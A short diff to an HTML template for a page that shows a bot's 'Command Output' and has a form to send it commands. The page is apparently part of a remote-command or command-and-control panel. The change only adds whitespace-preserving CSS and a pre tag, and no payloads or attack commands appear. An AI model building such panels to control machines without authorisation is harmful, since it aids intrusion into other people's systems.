@@ -24,6 +24,8 @@
             padding: 10px;
             border-radius: 5px;
             margin-bottom: 20px;
+            white-space: pre-wrap; /* Preserve whitespace and allow wrapping */
+            word-wrap: break-word; /* Allow long words to be broken into new lines */
         }
 
         form {
@@ -52,7 +54,9 @@
     <div class="container">
         <h1>Bot {{ bot_id }}</h1>
         <h2>Command Output</h2>
-        <div class="output">{{ decoded_data }}</div> <!-- Assuming the 6th column is output -->
+        <div class="output">
+            <pre>{{ decoded_data }}</pre> <!-- Using <pre> tag for formatting -->
+        </div>
         <form method="post">
             <input type="text" name="cmd" placeholder="Enter command" required>
             <button type="submit">Send Command</button>
